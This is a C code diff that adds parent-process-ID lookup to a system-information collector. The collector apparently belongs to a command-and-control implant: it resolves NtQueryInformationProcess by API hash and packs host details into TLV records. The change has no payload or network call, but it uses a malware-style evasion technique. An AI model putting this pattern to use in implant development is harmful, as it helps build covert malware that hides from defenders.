@@ -167,6 +167,31 @@ void sysinfo_collect(Buffer *tlv_out) {
     /* PID */
     tlv_add_uint32(tlv_out, TLV_PID, GetCurrentProcessId());
 
+    /* PPID — via NtQueryInformationProcess(ProcessBasicInformation) */
+    {
+        typedef NTSTATUS (NTAPI *pNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
+        pNtQIP fnNtQIP = (pNtQIP)api_resolve(HASH_NTDLL, 0xD034FC62);
+        if (fnNtQIP) {
+            /* PROCESS_BASIC_INFORMATION for x64:
+             *   NTSTATUS ExitStatus;     // +0x00 (4 bytes, padded to 8)
+             *   PVOID    PebBaseAddress; // +0x08
+             *   ULONG_PTR AffinityMask;  // +0x10
+             *   LONG     BasePriority;   // +0x18 (4 bytes, padded to 8)
+             *   ULONG_PTR UniqueProcessId;          // +0x20
+             *   ULONG_PTR InheritedFromUniqueProcessId; // +0x28
+             */
+            unsigned char pbi[48];
+            memset(pbi, 0, sizeof(pbi));
+            ULONG ret_len = 0;
+            NTSTATUS st = fnNtQIP(GetCurrentProcess(), 0 /* ProcessBasicInformation */,
+                                  pbi, sizeof(pbi), &ret_len);
+            if (st == 0) {
+                ULONG_PTR ppid_val = *(ULONG_PTR *)(pbi + 0x28);
+                tlv_add_uint32(tlv_out, TLV_PPID, (DWORD)ppid_val);
+            }
+        }
+    }
+
     /* Architecture */
 #ifdef _WIN64
     tlv_add_uint8(tlv_out, TLV_ARCH, ARCH_X64);
